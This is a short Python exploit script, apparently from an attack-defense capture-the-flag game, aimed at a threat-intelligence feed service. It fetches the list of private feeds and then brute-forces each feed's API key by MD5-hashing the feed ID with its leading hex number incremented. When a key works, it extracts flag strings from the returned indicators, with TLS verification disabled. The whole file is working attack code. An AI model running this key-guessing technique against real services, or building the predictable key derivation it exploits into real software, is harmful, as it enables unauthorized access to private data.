import requests
import hashlib
import sys
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

host = sys.argv[1]
flag_re = re.compile(r"TEAM\d{3}_[A-Z0-9]{32}")
#flag_re = re.compile(r"[A-Z0-9]{31}=")


private_feeds = requests.get(f"https://{host}/ti/feeds?is_public=false", verify=False).json()["items"]

for feed in private_feeds:
    feed_id = feed["id"]
    prefix = int(feed_id.split("-")[0], 16)
    suffix = feed_id.split("-")[1:]
    for i in range(50):
        api_key = hashlib.md5(f"{format(prefix + i, 'x')}-{'-'.join(suffix)}".encode()).hexdigest()
        resp = requests.get(f"https://{host}/ti/feeds/{feed_id}/iocs", headers={"X-API-Key": api_key}, verify=False)
        if resp.status_code == 200 and "Unauthorized" not in resp.text:
            print(f"[+] Found (on {i}): feed_id {feed_id} with the api key {api_key}")
            print(", ".join(flag_re.findall(resp.text)))
            break
print("[+] Completed")